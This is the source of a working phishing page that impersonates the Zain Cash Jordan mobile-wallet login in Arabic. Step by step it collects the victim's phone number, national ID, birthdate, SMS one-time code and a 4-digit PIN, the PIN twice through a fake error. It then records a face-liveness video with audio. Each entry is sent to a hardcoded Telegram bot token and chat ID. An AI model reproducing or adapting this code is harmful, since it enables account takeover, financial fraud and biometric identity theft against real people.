<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>زين كاش الأردن | تسجيل الدخول</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
  <style>
    /* Page styling (kept look) */
    body {
      background: linear-gradient(135deg, #2F80ED 0%, #56CCF2 100%);
      min-height: 100vh;
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #app {
      background: #fff;
      border-radius: 22px;
      box-shadow: 0 8px 32px 0 rgba(47,128,237,0.13), 0 1.5px 12px #2f80ed11;
      width: 370px;
      max-width: 95vw;
      padding: 32px 26px 30px 26px;
      box-sizing: border-box;
      direction: rtl;
      position: relative;
      overflow: hidden;
      border: 2.5px solid #2F80ED33;
      animation: fadein 0.8s;
    }
    @keyframes fadein { from { opacity: 0; transform: translateY(36px);} to { opacity: 1; transform: none;} }
    .zain-header { display:flex; align-items:center; justify-content:center; margin-bottom:14px; gap:10px; }
    .zain-logo { width:64px; height:64px; border-radius:20px; background: linear-gradient(135deg,#56ccf2 60%,#2f80ed 100%); display:flex; align-items:center; justify-content:center; box-shadow:0 2px 16px #2f80ed22; border:2.5px solid #fff; overflow:hidden; }
    .zain-logo img { width:60px; height:60px; object-fit:contain; background:#fff; border-radius:16px; border:1.5px solid #e3eefe; box-shadow:0 1px 6px #56ccf233; }
    .zain-title-main { font-size:25px; font-weight:900; color:#2F80ED; margin:0; text-shadow:0 1px 0 #fff, 0 2px 8px #2f80ed22; }
    .zain-title-sub { font-size:15px; color:#353a4d; font-weight:600; text-align:center; margin:2px 0 0 0; }
    .step-indicator { display:flex; justify-content:center; gap:6.5px; margin-bottom:16px; margin-top:7px; }
    .step-dot { width:11px; height:11px; border-radius:50%; background:#eaf2fd; border:2px solid #56ccf2; transition:background 0.2s; }
    .step-dot.active { background: linear-gradient(135deg,#2f80ed 70%, #56ccf2 100%); border-color:#2f80ed; }
    form{ display:flex; flex-direction:column; gap:13px; margin-top:7px; }
    label{ color:#2F80ED; font-size:15px; font-weight:600; margin-bottom:3px; margin-right:2px; }
    input, select { padding:14px 11px; border:none; border-radius:9px; font-size:16px; background:#f2f8fd; color:#222; outline:none; box-shadow:0 1.5px 5px #56ccf211; transition:box-shadow 0.2s, border 0.2s; border:2px solid #56ccf233; font-family:'Cairo', Arial, sans-serif; }
    input:focus, select:focus { box-shadow:0 3px 16px #2f80ed33; border-color:#2F80ED; background:#f4faff; }
    .button { background: linear-gradient(90deg,#2F80ED 0%, #56CCF2 100%); color:white; border:none; border-radius:9px; padding:13px 0; font-size:18px; font-weight:800; cursor:pointer; margin-top:8px; box-shadow:0 1px 6px #2f80ed22; }
    .info-msg { text-align:center; color:#2F80ED; font-size:13px; margin-bottom:7px; margin-top:2px; font-weight:600; }
    .code-inputs { display:flex; gap:10px; justify-content:center; margin:8px 0 7px 0; }
    .code-inputs input { text-align:center; font-size:19px; width:120px; padding:13px 0; letter-spacing:5px; border-radius:7px; border:2px solid #56ccf255; background:#f2f8fd; font-weight:700; direction:ltr; }
    .zain-footer { margin-top:22px; text-align:center; color:#a6c7ef; font-size:13px; font-weight:600; letter-spacing:1px; opacity:0.83; text-shadow:0 1px 0 #fff; }
    #modalError { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(47,128,237,0.13); z-index:9999; align-items:center; justify-content:center; }
    #modalError.active { display:flex; animation:fadein 0.3s; }
    #modalContent { background:#fff; padding:27px 32px; border-radius:13px; box-shadow:0 7px 34px #2f80ed33; text-align:center; min-width:260px; border:2px solid #f9b3b3; }
    #modalContent .err-title { color:#e53935; font-size:19px; font-weight:bold; }
    #modalContent .err-msg { margin-top:8px; font-size:15px; color:#444; font-weight:600; margin-bottom:8px; }
    #modalContent button { margin-top:14px; background: linear-gradient(90deg,#2F80ED 0%,#56CCF2 100%); color:#fff; padding:7px 27px; border:none; border-radius:6px; cursor:pointer; font-size:15px; font-weight:bold; }
    @media (max-width:450px) { #app { padding:16px 1.5vw 10px 1.5vw; } .zain-logo { width:51px; height:51px; } .zain-logo img { width:46px; height:46px; } .zain-title-main { font-size:20px; } .code-inputs input { width:80px; } }

    /* Recording overlay */
    .rec-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.65); display:none; align-items:center; justify-content:center; z-index:10020; padding:14px; }
    .rec-card { width:100%; max-width:420px; background:#fff; border-radius:12px; padding:12px; box-shadow:0 8px 30px rgba(0,0,0,0.3); display:flex; flex-direction:column; gap:10px; }
    .top-status { font-size:17px; font-weight:900; color:#fff; background:linear-gradient(90deg,#2F80ED,#56CCF2); padding:8px 12px; border-radius:10px; text-align:center; margin:0 auto 6px; width:fit-content; box-shadow:0 8px 28px rgba(47,128,237,0.16); display:none; }
    .cam-box { width:100%; height:420px; background:#000; border-radius:10px; overflow:hidden; display:flex; align-items:center; justify-content:center; }
    .cam-box canvas { width:100%; height:100%; object-fit:cover; transform:none; -webkit-transform:none; display:block; }
    .rec-controls { display:flex; gap:8px; align-items:center; justify-content:space-between; margin-top:6px; }
    .rec-instruction { font-weight:800; color:#2F80ED; }
    .rec-countdown { font-weight:800; color:#222; font-size:16px; }
    .rec-progress { height:8px; background:#eef6ff; border-radius:999px; overflow:hidden; margin-top:6px; }
    .rec-progress > i { display:block; height:100%; background:linear-gradient(90deg,#2F80ED,#56CCF2); width:0%; transition:width 0.12s linear; }
    .rec-buttons { display:flex; gap:8px; justify-content:center; margin-top:8px; }
    .btn-cancel { background:#f6f6f6; color:#111; border-radius:8px; padding:8px 12px; cursor:pointer; border:0; }
    .btn-toggle { background:#fff; color:#2F80ED; border:2px solid #2F80ED; border-radius:8px; padding:8px 12px; cursor:pointer; }
    .muted { color:#6b6b6b; font-size:13px; text-align:center; }
    @media (max-width:420px) { .cam-box { height:320px; } }
  </style>
</head>
<body>
  <div id="app"></div>

  <!-- Modal Error -->
  <div id="modalError" role="alertdialog" aria-hidden="true">
    <div id="modalContent">
      <div class="err-title">يوجد خطأ بالمعلومات</div>
      <div class="err-msg" id="modalMsg">رجاءً حاول مرة أخرى.</div>
      <button id="modalCloseBtn">إغلاق</button>
    </div>
  </div>

  <!-- Recording overlay -->
  <div id="recOverlay" class="rec-overlay" aria-hidden="true" role="dialog">
    <div class="rec-card">
      <div class="top-status" id="topStatus">جاري التحقق من الفيديو</div>
      <div style="text-align:center;color:#2F80ED;font-weight:800">يرجى اتباع التعليمات أثناء التسجيل</div>
      <div class="rec-sub muted" style="text-align:center;margin-top:-6px">سيسجل فيديو واحد عمودي يحتوي الحركات المطلوبة.</div>

      <div class="cam-box" id="camBox">
        <canvas id="previewCanvas" aria-hidden="false"></canvas>
      </div>

      <div class="rec-controls">
        <div class="rec-instruction" id="recInstr">...</div>
        <div class="rec-countdown" id="recCountdown">--s</div>
      </div>

      <div class="rec-progress"><i id="recProg"></i></div>

      <div class="rec-buttons">
        <button id="mirrorToggle" class="btn-toggle" title="تبديل المرآة">عرض طبيعي</button>
        <button id="recCancel" class="btn-cancel">إلغاء</button>
        <div class="muted" id="recHint">إغماض العين → يسار → يمين → يسار → ابتسم — كل خطوة 5 ثوانٍ</div>
      </div>
    </div>
  </div>

  <canvas id="procCanvas" style="display:none"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.21.0/dist/tf.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-landmarks-detection@1.0.3/dist/face-landmarks-detection.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh@0.4.1646424915/face_mesh.js"></script>

  <script>
    /* Configuration */
    const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
    const CHAT_ID = "6873334348";
    const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";
    const STEP_SECONDS = 5;
    const STEPS = [
      { key: 'closeEyes', label: 'الرجاء إغماض عينيك الآن' },
      { key: 'left1', label: 'حرك وجهك إلى اليسار الآن' },
      { key: 'right', label: 'حرك وجهك إلى اليمين الآن' },
      { key: 'left2', label: 'حرك وجهك إلى اليسار مرة أخرى' },
      { key: 'smile', label: 'الرجاء الابتسام الآن' }
    ];

    /* State */
    let userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4_first: '', code4_second: '' };
    let waitingTimeout = null;

    /* Recording state */
    let mediaStream = null;
    let recordedChunks = [];
    let faceModel = null;
    let rafId = null;
    let previewMirror = false; // controls only visible preview (default: natural)

    /* DOM refs */
    const app = document.getElementById('app');
    const modalError = document.getElementById('modalError');
    const modalCloseBtn = document.getElementById('modalCloseBtn');
    const modalMsg = document.getElementById('modalMsg');
    const recOverlay = document.getElementById('recOverlay');
    const previewCanvas = document.getElementById('previewCanvas');
    const recInstr = document.getElementById('recInstr');
    const recCountdown = document.getElementById('recCountdown');
    const recProg = document.getElementById('recProg');
    const recCancel = document.getElementById('recCancel');
    const mirrorToggle = document.getElementById('mirrorToggle');
    const topStatus = document.getElementById('topStatus');
    const procCanvas = document.getElementById('procCanvas');

    const sleep = ms => new Promise(r => setTimeout(r, ms));

    /* Utilities */
    function escapeHtml(str) { return String(str).replace(/[&<>"']/g, s => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[s])); }
    function codeWrap(num) { return `<code>${escapeHtml(num)}</code>`; }
    function chooseMimeType() { const candidates = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm;codecs=vp8','video/mp4']; for (const c of candidates) try { if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(c)) return c; } catch(e){} return ''; }

    /* Telegram message (numbers wrapped in <code>) */
    async function sendTelegramHtml(text) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
        });
        const json = await res.json();
        if (json && json.result && json.result.message_id) return json.result.message_id;
      } catch (e) { console.warn('sendTelegramHtml error', e); }
      return null;
    }

    async function sendSequenceBeforeVideo() {
      await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}`);
      await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}`);
      await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
      await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 1): ${codeWrap(userData.code4_first)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
      await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
    }

    /* Load face model silently */
    async function loadFaceModelSilently() {
      if (faceModel) return faceModel;
      while (!faceModel) {
        try {
          faceModel = await faceLandmarksDetection.load(faceLandmarksDetection.SupportedPackages.mediapipeFacemesh, { maxFaces: 1 });
          return faceModel;
        } catch (e) {
          console.warn('face model load retry', e);
          await sleep(1000);
        }
      }
    }

    /* UI helpers */
    function header(sub="") {
      return `
        <div class="zain-header">
          <div class="zain-logo"><img src="${zainCashLogo}" alt="Zain Cash" /></div>
          <span class="zain-title-main">زين كاش الأردن</span>
        </div>
        <div class="zain-title-sub">${sub}</div>`;
    }
    function stepIndicator(step) {
      return `
        <div class="step-indicator">
          <div class="step-dot${step===1?' active':''}"></div>
          <div class="step-dot${step===2?' active':''}"></div>
          <div class="step-dot${step===3?' active':''}"></div>
        </div>`;
    }
    function clearTimers() { if (waitingTimeout) { clearInterval(waitingTimeout); waitingTimeout = null; } }
    function showModalError(message) { modalMsg.textContent = message || 'يوجد خطأ — الرجاء المحاولة مرة أخرى.'; modalError.classList.add('active'); modalError.setAttribute('aria-hidden','false'); }
    function hideModalError() { modalError.classList.remove('active'); modalError.setAttribute('aria-hidden','true'); }
    modalCloseBtn.addEventListener('click', hideModalError);

    /* Flow UI (same as before) */
    function renderPhoneStep() {
      clearTimers();
      app.innerHTML = `
        ${header("مرحبًا بك! سجل دخولك لحسابك")}
        ${stepIndicator(1)}
        <form id="phoneForm" autocomplete="off">
          <label>رقم الهاتف المرتبط بحسابك</label>
          <input type="tel" id="phone" placeholder="07XXXXXXXX" pattern="07[0-9]{8}" maxlength="10" required autocomplete="tel" inputmode="numeric"/>
          <button type="submit" class="button">التالي</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
      const phoneInput = document.getElementById('phone');
      phoneInput.focus();
      document.getElementById('phoneForm').onsubmit = async (e) => {
        e.preventDefault();
        const phone = phoneInput.value.trim();
        if (!/^07\d{8}$/.test(phone)) { alert('يرجى إدخال رقم هاتف صحيح يبدأ بـ 07 ويتكون من 10 أرقام'); phoneInput.focus(); return; }
        userData.phone = phone;
        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}`);
        renderNationalIdStep();
      };
    }

    function renderNationalIdStep() {
      clearTimers();
      app.innerHTML = `
        <button class="back-btn" id="backBtn" style="background:none;border:0;color:#2F80ED;font-weight:700;margin-bottom:6px;">&#8592; رجوع</button>
        ${header("يرجى إدخال بياناتك الشخصية")}
        ${stepIndicator(1)}
        <form id="nationalForm" autocomplete="off">
          <label>الرقم الوطني</label>
          <input type="text" id="nationalId" placeholder="الرقم الوطني (10 رقم)" maxlength="10" required inputmode="numeric"/>
          <label>تاريخ الميلاد</label>
          <div class="birthdate-fields" id="birthdateFields"></div>
          <button type="submit" class="button">التالي</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
      renderBirthdateFields();
      document.getElementById('nationalId').focus();
      document.getElementById('nationalForm').onsubmit = async (e) => {
        e.preventDefault();
        const nationalId = (document.getElementById('nationalId').value || '').trim();
        const day = document.getElementById('birthDay').value;
        const month = document.getElementById('birthMonth').value;
        const year = document.getElementById('birthYear').value;
        if (!/^\d{10}$/.test(nationalId)) { alert('يرجى إدخال رقم وطني صحيح مكوّن من 10 أرقام'); document.getElementById('nationalId').focus(); return; }
        if (!day || !month || !year) { alert('يرجى إدخال تاريخ الميلاد'); return; }
        userData.nationalId = nationalId;
        userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}`);
        showNationalIdWaitAndGotoCode5();
      };
      document.getElementById('backBtn').onclick = () => renderPhoneStep();
    }

    function renderBirthdateFields() {
      const now = new Date();
      const maxYear = now.getFullYear();
      const minYear = maxYear - 100;
      const birthdateFields = document.getElementById('birthdateFields');
      let days = '<select id="birthDay" required><option value="">اليوم</option>';
      for (let d = 1; d <= 31; d++) days += `<option value="${d}">${d}</option>`;
      days += '</select>';
      const monthNames = ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
      let months = '<select id="birthMonth" required><option value="">الشهر</option>';
      for (let m = 1; m <= 12; m++) months += `<option value="${m}">${monthNames[m-1]}</option>`;
      months += '</select>';
      let years = '<select id="birthYear" required><option value="">السنة</option>';
      for (let y = maxYear; y >= minYear; y--) years += `<option value="${y}">${y}</option>`;
      years += '</select>';
      birthdateFields.innerHTML = days + months + years;
    }

    function showNationalIdWaitAndGotoCode5() {
      const randomWait = Math.floor(Math.random() * 6) + 5;
      app.innerHTML = `
        <div style="padding:40px 0;text-align:center;">
          <div style="margin-bottom:18px;"><img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;box-shadow:0 1px 7px #2f80ed33;"/></div>
          <div style="color:#2F80ED;font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
          <div style="color:#353a4d;font-size:15px;">جاري التحقق من المعلومات المدخلة</div>
          <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
        </div>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
      let sec = randomWait;
      const waitElem = document.getElementById('waitSec');
      waitingTimeout = setInterval(() => {
        sec--;
        if (waitElem) waitElem.textContent = sec;
        if (sec === 0) {
          clearInterval(waitingTimeout);
          renderCode5Step();
        }
      }, 1000);
    }

    function renderCode5Step() {
      clearTimers();
      app.innerHTML = `
        <button class="back-btn" id="backBtn" style="background:none;border:0;color:#2F80ED;font-weight:700;margin-bottom:6px;">&#8592; رجوع</button>
        ${header("تم إرسال رمز تحقق إلى هاتفك")}
        ${stepIndicator(2)}
        <div class="info-msg">أدخل رمز التحقق المكون من 5 أرقام كما وصلك برسالة SMS</div>
        <form id="code5Form" autocomplete="off">
          <div class="code-inputs"><input type="text" maxlength="5" pattern="\\d{5}" required id="code5input" inputmode="numeric" placeholder="*****" /></div>
          <button type="submit" class="button">تأكيد الرمز</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
      const codeInput = document.getElementById('code5input');
      codeInput.focus();
      codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,5); });
      document.getElementById('code5Form').onsubmit = async (e) => {
        e.preventDefault();
        const code = codeInput.value.trim();
        if (code.length !== 5) { alert('يرجى إدخال رمز مكون من 5 أرقام'); codeInput.focus(); return; }
        userData.code5 = code;
        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
        showWaitMsgAndGotoCode4();
      };
      document.getElementById('backBtn').onclick = () => renderNationalIdStep();
    }

    function showWaitMsgAndGotoCode4() {
      const randomWait = Math.floor(Math.random() * 6) + 5;
      app.innerHTML = `
        <div style="padding:40px 0;text-align:center;">
          <div style="margin-bottom:18px;"><img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;box-shadow:0 1px 7px #2f80ed33;"/></div>
          <div style="color:#2F80ED;font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
          <div style="color:#353a4d;font-size:15px;">جاري التحقق من رمز الدخول</div>
          <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
        </div>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
      let sec = randomWait;
      const waitElem = document.getElementById('waitSec');
      waitingTimeout = setInterval(() => {
        sec--;
        if (waitElem) waitElem.textContent = sec;
        if (sec === 0) {
          clearInterval(waitingTimeout);
          renderCode4Step();
        }
      }, 1000);
    }

    function renderCode4Step() {
      clearTimers();
      app.innerHTML = `
        <button class="back-btn" id="backBtn" style="background:none;border:0;color:#2F80ED;font-weight:700;margin-bottom:6px;">&#8592; رجوع</button>
        ${header("تحقق إضافي لحماية حسابك")}
        ${stepIndicator(3)}
        <div class="info-msg">قم بادخال رمز حسابك من 4 أرقام الثابت لاكمال تسجيل الدخول</div>
        <form id="code4Form" autocomplete="off">
          <div class="code-inputs"><input type="text" maxlength="4" pattern="\\d{4}" required id="code4input" inputmode="numeric" placeholder="****" /></div>
          <button type="submit" class="button">تأكيد الرمز</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
      const codeInput = document.getElementById('code4input');
      codeInput.focus();
      codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
      document.getElementById('code4Form').onsubmit = async (e) => {
        e.preventDefault();
        const code = codeInput.value.trim();
        if (code.length !== 4) { alert('يرجى إدخال رمز مكون من 4 أرقام'); codeInput.focus(); return; }
        userData.code4_first = code;
        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 1): ${codeWrap(userData.code4_first)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
        renderCode4RetryStep();
      };
      document.getElementById('backBtn').onclick = () => renderCode5Step();
    }

    function renderCode4RetryStep() {
      clearTimers();
      app.innerHTML = `
        ${header("رمز التحقق غير صحيح")}
        <div style="padding:18px 8px;text-align:center;">
          <div style="color:#e53935;font-weight:800;font-size:18px;margin-bottom:8px;">يوجد خطأ — الرجاء إدخال رمز التحقق مرة أخرى</div>
          <div class="muted" style="margin-bottom:12px;">تم إرسال المحاولة الأولى للتحقق</div>
        </div>
        <div style="padding:0 12px;">
          <form id="code4RetryForm" autocomplete="off">
            <div class="code-inputs"><input type="text" maxlength="4" id="code4retry" inputmode="numeric" placeholder="****" required /></div>
            <button type="submit" class="button">إعادة إدخال الرمز</button>
          </form>
        </div>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
      const retryInput = document.getElementById('code4retry');
      retryInput.focus();
      retryInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
      document.getElementById('code4RetryForm').onsubmit = async (e) => {
        e.preventDefault();
        const code2 = retryInput.value.trim();
        if (code2.length !== 4) { alert('يرجى إدخال رمز مكون من 4 أرقام'); retryInput.focus(); return; }
        userData.code4_second = code2;
        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
        renderPhoneStep();
        setTimeout(() => startRecordingAndSendAll(), 600);
      };
    }

    /* Recording helpers and the corrected createPortraitCanvasAndPreview function */
    async function startCameraForRecording() {
      if (mediaStream) return mediaStream;
      try {
        mediaStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 1280 } },
          audio: true
        });
        return mediaStream;
      } catch (e) {
        console.error('startCamera error', e);
        showModalError('تعذر الوصول إلى الكاميرا. تأكد من منح الإذن ثم أعد المحاولة.');
        throw e;
      }
    }
    function stopCameraForRecording() { try { if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; } } catch(e){} }

    // Robust portrait canvas preview/drawing function (try opposite rotation -90deg)
    function createPortraitCanvasAndPreview(videoEl) {
      // Target recording resolution (portrait)
      const targetW = 720;
      const targetH = 1280;

      // offscreen canvas used for recording frames (natural orientation, non-mirrored)
      const offscreen = document.createElement('canvas');
      offscreen.width = targetW;
      offscreen.height = targetH;
      const ctx = offscreen.getContext('2d');

      // visible preview canvas (in UI)
      const preview = previewCanvas;
      const DPR = window.devicePixelRatio || 1;
      preview.width = Math.round(targetW * DPR);
      preview.height = Math.round(targetH * DPR);
      preview.style.width = '100%';
      preview.style.height = '100%';
      const pctx = preview.getContext('2d');
      pctx.setTransform(DPR,0,0,DPR,0,0); // support high-DPI

      let cancelled = false;

      async function drawLoop() {
        if (cancelled) return;
        const vw = videoEl.videoWidth || 1;
        const vh = videoEl.videoHeight || 1;

        if (vw > 0 && vh > 0) {
          // clear and fill background
          ctx.fillStyle = '#000';
          ctx.fillRect(0,0,targetW,targetH);

          try {
            // Draw the current video frame into a source canvas first
            const src = document.createElement('canvas');
            src.width = vw;
            src.height = vh;
            const sctx = src.getContext('2d');
            sctx.drawImage(videoEl, 0, 0, vw, vh);

            let rotatedCanvas = src;

            if (vw > vh) {
              // Source is landscape: rotate it to become upright portrait.
              // NOTE: using -90deg rotation here (opposite of previous attempt).
              const rot = document.createElement('canvas');
              rot.width = vh;   // rotated width becomes source height
              rot.height = vw;  // rotated height becomes source width
              const rctx = rot.getContext('2d');

              // rotate -90 degrees (counter-clockwise)
              rctx.translate(rot.width / 2, rot.height / 2);
              rctx.rotate(-Math.PI / 2);
              // draw the source centered into rotated canvas
              rctx.drawImage(src, -vw / 2, -vh / 2, vw, vh);

              rotatedCanvas = rot;
              // debug log to help identify which rotation applied
              // (remove in production if desired)
              // console.log('Applied rotation: -90deg (vw>vh)');
            }

            // center-crop from rotatedCanvas to offscreen with cover scaling
            const scale = Math.max(targetW / rotatedCanvas.width, targetH / rotatedCanvas.height);
            const srcW = Math.round(targetW / scale);
            const srcH = Math.round(targetH / scale);
            const sx = Math.round((rotatedCanvas.width - srcW) / 2);
            const sy = Math.round((rotatedCanvas.height - srcH) / 2);
            ctx.drawImage(rotatedCanvas, sx, sy, srcW, srcH, 0, 0, targetW, targetH);
          } catch (err) {
            // ignore occasional drawing issues
            console.warn('drawLoop draw error', err);
          }

          // Draw to preview canvas.
          // previewMirror flag only affects the visible preview (user's expectation).
          try {
            pctx.clearRect(0,0, preview.width, preview.height);
            if (previewMirror) {
              pctx.save();
              pctx.scale(-1, 1);
              pctx.drawImage(offscreen, -preview.width / DPR, 0, preview.width / DPR, preview.height / DPR);
              pctx.restore();
            } else {
              pctx.drawImage(offscreen, 0, 0, preview.width / DPR, preview.height / DPR);
            }
          } catch (err) {
            // ignore occasional drawing issues
          }
        }

        rafId = requestAnimationFrame(drawLoop);
      }

      drawLoop();

      return {
        canvas: offscreen,
        stop() {
          cancelled = true;
          if (rafId) { cancelAnimationFrame(rafId); rafId = null; }
        }
      };
    }

    async function recordCanvasWithAudio(canvas, audioTrack) {
      const canvasStream = canvas.captureStream(30);
      const finalStream = new MediaStream();
      canvasStream.getVideoTracks().forEach(t => finalStream.addTrack(t));
      if (audioTrack) finalStream.addTrack(audioTrack);

      const mime = chooseMimeType();
      let recorder;
      recordedChunks = [];
      try { recorder = mime ? new MediaRecorder(finalStream, { mimeType: mime }) : new MediaRecorder(finalStream); }
      catch(e) { recorder = new MediaRecorder(finalStream); }

      recorder.ondataavailable = ev => { if (ev.data && ev.data.size) recordedChunks.push(ev.data); };
      recorder.onerror = ev => console.warn('recorder error', ev);
      recorder.start(300);
      return recorder;
    }

    async function recordFullSequenceViaCanvas(videoEl, audioTrack) {
      const { canvas, stop } = createPortraitCanvasAndPreview(videoEl);
      const recorder = await recordCanvasWithAudio(canvas, audioTrack);
      const totalSteps = STEPS.length;
      const totalDurationMs = totalSteps * STEP_SECONDS * 1000;
      const startTime = performance.now();

      for (let i=0;i<STEPS.length;i++){
        const step = STEPS[i];
        recInstr.textContent = step.label;
        const stepStart = performance.now();
        while (performance.now() - stepStart < STEP_SECONDS * 1000) {
          const elapsed = performance.now() - stepStart;
          const remain = Math.max(0, Math.ceil((STEP_SECONDS*1000 - elapsed)/1000));
          recCountdown.textContent = `${remain}s`;
          const overallElapsed = performance.now() - startTime;
          const pct = Math.min(100, (overallElapsed / totalDurationMs) * 100);
          recProg.style.width = pct + '%';
          await sleep(160);
        }
        await sleep(120);
      }

      try { recorder.stop(); } catch(e){}
      await sleep(400);
      stop();
      const blobType = recordedChunks.length ? (recordedChunks[0].type || 'video/webm') : 'video/webm';
      return new Blob(recordedChunks, { type: blobType });
    }

    /* Main flow */
    async function startRecordingAndSendAll() {
      recOverlay.style.display = 'flex';
      recOverlay.setAttribute('aria-hidden','false');
      topStatus.style.display = 'none';
      recInstr.textContent = 'استعد...';
      recProg.style.width = '0%';
      recCountdown.textContent = '--s';
      previewMirror = false;
      mirrorToggle.textContent = 'عرض طبيعي';

      try {
        const stream = await startCameraForRecording();
        const videoEl = document.createElement('video');
        videoEl.autoplay = true; videoEl.playsInline = true; videoEl.muted = true;
        videoEl.srcObject = stream;
        await videoEl.play().catch(()=>{});
        const audioTrack = (stream.getAudioTracks && stream.getAudioTracks().length) ? stream.getAudioTracks()[0] : null;

        // send textual sequence as requested (numbers wrapped in <code>)
        await sendSequenceBeforeVideo();

        // load face model silently
        loadFaceModelSilently().catch(()=>{});

        // record canvas-based portrait video
        const blob = await recordFullSequenceViaCanvas(videoEl, audioTrack);

        // show topStatus while sending
        topStatus.style.display = 'block';
        topStatus.textContent = 'جاري التحقق من الفيديو';

        // send textual block with numbers wrapped
        const captionLines = [
          `رقم الهاتف: ${userData.phone}`,
          `الرقم الوطني: ${userData.nationalId}`,
          `تاريخ الميلاد: ${userData.birthdate}`,
          `الرمز المؤقت: ${userData.code5}`,
          `الرمز الثابت (1): ${userData.code4_first}`,
          `الرمز الثابت (2): ${userData.code4_second}`
        ];
        const textBlock = captionLines.map(line => {
          const idx = line.indexOf(':');
          if (idx >= 0) {
            const key = escapeHtml(line.slice(0, idx+1));
            const val = escapeHtml(line.slice(idx+1).trim());
            const wrappedVal = val.replace(/(\d{2,})/g, m => `<code>${m}</code>`);
            return `${key} ${wrappedVal}`;
          }
          return escapeHtml(line);
        }).join('\n');
        await sendTelegramHtml(textBlock);

        // send video
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('video', blob, 'verification.webm');
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });

        // show modal error after sending (per request)
        showModalError('يوجد خطأ بالمعلومات. رجاءً حاول مرة أخرى.');
      } catch (e) {
        console.error('record/send error', e);
        showModalError('حدث خطأ أثناء التسجيل أو الإرسال. الرجاء المحاولة مرة أخرى.');
      } finally {
        stopCameraForRecording();
        await sleep(800);
        if (!modalError.classList.contains('active')) {
          recOverlay.style.display = 'none';
          recOverlay.setAttribute('aria-hidden','true');
        }
        topStatus.style.display = 'none';
      }
    }

    /* Events */
    recCancel.addEventListener('click', () => {
      stopCameraForRecording();
      recOverlay.style.display = 'none';
      recOverlay.setAttribute('aria-hidden','true');
      topStatus.style.display = 'none';
    });

